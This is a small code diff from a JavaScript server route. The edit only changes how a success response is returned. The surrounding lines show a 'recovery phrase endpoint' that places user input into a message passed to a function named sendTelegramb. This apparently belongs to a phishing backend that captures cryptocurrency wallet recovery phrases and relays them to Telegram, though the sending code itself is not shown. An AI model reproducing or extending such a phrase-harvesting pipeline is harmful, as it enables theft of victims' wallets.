@@ -79,7 +79,7 @@ function sendTelegramb(msg) {
 ─────────────
 📥 Input: ${inpvalue}
 `);
-  res.status(200).json({msg:'great'})
+  res.json({msg:'great'})
      } catch (err) {
          console.error('❌ Error in recovery phrase endpoint:', err); 
          res.status(500).json({ error: 'Internal server error', details: err.message });
